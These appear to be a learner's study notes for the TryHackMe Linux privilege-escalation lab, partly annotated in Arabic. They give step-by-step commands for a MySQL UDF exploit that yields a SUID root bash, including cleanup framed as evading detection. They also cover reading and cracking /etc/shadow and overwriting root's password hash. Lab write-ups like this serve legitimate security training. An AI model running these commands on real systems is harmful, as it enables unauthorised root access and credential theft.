# Linux PrivEsc

[tryhackme_Linux PrivEsc](https://tryhackme.com/room/linuxprivesc?ref=blog.tryhackme.com)


<details>
  <summary>Service Exploits</summary>

## Linux Privilege Escalation via MySQL UDF Exploit

### 🎯 Goal

Gain **root shell access** by exploiting a misconfigured MySQL service (running as root with no password) using a **User Defined Function (UDF)**.

---

### 🔹 Overview

* MySQL is running **as root**.
* The **"root" MySQL user has no password**.
* We'll use a known exploit (`raptor_udf2.c`) to create a MySQL function that executes **system commands as root**.

---

### 🧪 Step-by-Step Instructions

#### 1. 🔧 Go to the exploit directory:

```bash
cd /home/user/tools/mysql-udf
```

#### 2. ⚙️ Compile the UDF exploit code:

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

* This compiles the `.c` code into a shared object `.so` file.
* `-fPIC` and `-shared` are necessary to load it as a library into MySQL.

#### 3. 🛠️ Connect to MySQL as root (no password):

```bash
mysql -u root
```

#### 4. 📦 Create the custom function in MySQL:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

* This loads the `.so` file as a **MySQL plugin**.
* It creates a **new function `do_system()`** that can execute system commands.

#### 5. 🧨 Use the function to gain a root shell:

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

* Copies `/bin/bash` to `/tmp/rootbash`.
* Sets SUID bit so it runs **with root privileges**.

#### 6. 🚪 Exit MySQL and run root shell:

```bash
exit
/tmp/rootbash -p
```

* `-p` allows bash to run as the **effective UID 0 (root)**.

#### 7. 🧹 Clean Up

```bash
rm /tmp/rootbash
exit
```

* Delete the SUID binary.
* Exit root shell to avoid detection.

---

### ✅ Summary

| Step | Action                                           |
| ---- | ------------------------------------------------ |
| 1    | Compile UDF exploit into `.so` file              |
| 2    | Connect to MySQL (no password)                   |
| 3    | Inject `.so` into MySQL plugin path              |
| 4    | Create and use `do_system()` to copy + SUID bash |
| 5    | Run bash with `-p` for root shell                |
| 6    | Remove `/tmp/rootbash` and exit                  |

🔐 **Always clean up and remove root shells after testing!**

---

🛡️ **Note:** This method only works if:

* MySQL runs as root
* You can connect as root (no password)
* You can write to plugin directory (`/usr/lib/mysql/plugin`)

Used responsibly, this is a great example of **local privilege escalation** via a poorly configured MySQL setup.

  
</details>




<details>
  <summary>Weak File Permissions</summary>

* <details>
    <summary>Readable /etc/shadow</summary>

    ### 1. Readable /etc/shadow (يمكن قراءته)

    * `ls -l /etc/shadow`
        * `-rw-r----- root shadow /etc/shadow` (أي يمكن قرائته)

    * `cat /etc/shadow`
    * (كل اليوزرات بالباسورد تبعها متهاش Hash)

    * **To know type of hash**
        * `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
    * (يكسر ال hash و يقولك على نوعه)
    
  </details>

* <details>
  <summary>Writable /etc/shadow</summary>

   ### 2. Writable /etc/shadow (يمكن الكتابة)

   * (لو الملف ده ينفع تكتب فيه هتمسح الباسورد بتاع ال root user أو admin user وتحط مكانه باسورد من عندك)

   * `mkpasswd -m sha-512 newpassword`    (ممكن تعمل باسورد بالامر ده)
      

   * `su root`
    * (ادخل الباسورد الجديد)
    * !!!مبروك
  
  </details>




  
</details>































































